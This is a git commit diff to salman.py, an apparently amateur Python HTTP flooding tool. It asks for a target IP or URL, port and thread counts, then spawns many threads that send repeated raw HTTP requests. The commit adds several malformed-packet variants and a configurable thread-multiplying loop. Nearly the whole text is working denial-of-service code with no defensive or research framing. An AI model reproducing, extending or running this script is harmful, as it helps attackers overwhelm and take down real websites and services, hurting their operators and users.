f3b489f06d5fe3fd98391a780e55d2a034727640
canal24-0xy <canalkun24@gmail.com>
2025-09-14 20:34:30 +0700

    Update salman.py

--- salman.py
+++ salman.py
@@ -10,7 +10,7 @@ try:
     import sys
     from colorama import Fore
 except ModuleNotFoundError as e:
-    print(f"{e} CAN'T IMPORT . . . .")
+    print(f"{e} cant import . . . .")
     exit()
 
 # DEF & CLASS
@@ -22,7 +22,7 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}=>{Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"{Fore.YELLOW}flooding {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -36,18 +36,29 @@ def generate_url_path_choice(num):
     return data
 
 # DOS
-def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
+def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
     rps = 0
     url_path = ''
     path_get = ['PY_FLOOD','CHOICES_FLOOD']
     path_get_loader = random.choice((path_get))
-    if path_get_loader == "PY_FLOOD":
+    if path_get_loader == "py_flood":
         url_path = generate_url_path_pyflooder(5)
     else:
         url_path = generate_url_path_choice(5)
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     try:
-        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
+        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
+        elif data_type_loader_packet == 'OWN1':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
+        elif data_type_loader_packet == 'OWN2':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
+        elif data_type_loader_packet == 'OWN3':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
+        elif data_type_loader_packet == 'OWN4':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
+        elif data_type_loader_packet == 'OWN5':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
             s.sendall(packet_data)
@@ -63,50 +74,52 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
 
 status_code = False
 id_loader = 0
-def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
+def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
     global status_code,id_loader
     if status_code == True:
         while time.time() < time_loader:
             for _ in range(spam_loader):
                 id_loader += 1
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
     else:
-        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
 
 #DATA
 banner = f"""
-{Fore.YELLOW}
-{Fore.LIGHTYELLOW_EX}
-{Fore.YELLOW}     
+{Fore.YELLOW}    
 {Fore.YELLOW} 
+{Fore.YELLOW}
 {Fore.WHITE}
-{Fore.WHITE} 
-{Fore.RED}╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗
-{Fore.LIGHTRED_EX}╚═╗║ ║║  ╠╩╗║╣ 
-{Fore.WHITE}╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩{Fore.RESET}"""
+{Fore.WHITE}
+ {Fore.RED}
+{Fore.LIGHTRED_EX} 
+{Fore.WHITE}        ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐
+╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ 
+╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘  {Fore.YELLOW}# (OFFLINE) {Fore.LIGHTYELLOW_EX}TOOL v2 #{Fore.RESET}"""
 
 print(banner)
 host = ""
 ip = ""
-target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
-port_loader = int(input(f"{Fore.YELLOW}PORT>"))
-time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
-spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 OR 299)>"))
-create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)>"))
-print(f"{Fore.LIGHTCYAN_EX}       EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
-print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
-methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
-print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
+print(f"{Fore.LIGHTWHITE_EX}pyp own1-5")
+data_type_loader_packet = input(f"{Fore.WHITE}type packet (Pypython example=own1)>").upper()
+target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL =⟩")
+port_loader = int(input(f"{Fore.YELLOW}Port =⟩"))
+time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}time (250) =⟩"))
+spam_loader = int(input(f"{Fore.RED}Spam (300) =⟩ "))
+create_thread = int(input(F"{Fore.LIGHTGREEN_EX}create threads (50)>"))
+booter_sent = int(input(F"{Fore.GREEN}Sent Attack (500 or 1000) =⟩ "))
+methods_loader = input(f"{Fore.LIGHTBLUE_EX}HTTP_methods (GET POST HEAD)>").upper()
+spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}spam create thread (5 ) =⟩ "))
+print(f"{Fore.MAGENTA}trying to GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
 try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
     ip = socket.gethostbyname(host)
@@ -115,11 +128,9 @@ except socket.gaierror:
 for loader_num in range(create_thread):
     sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
     sys.stdout.flush()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    
+    for _ in range(spam_create_thread):
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
 clear_text()
 print(banner)
 status_code = True
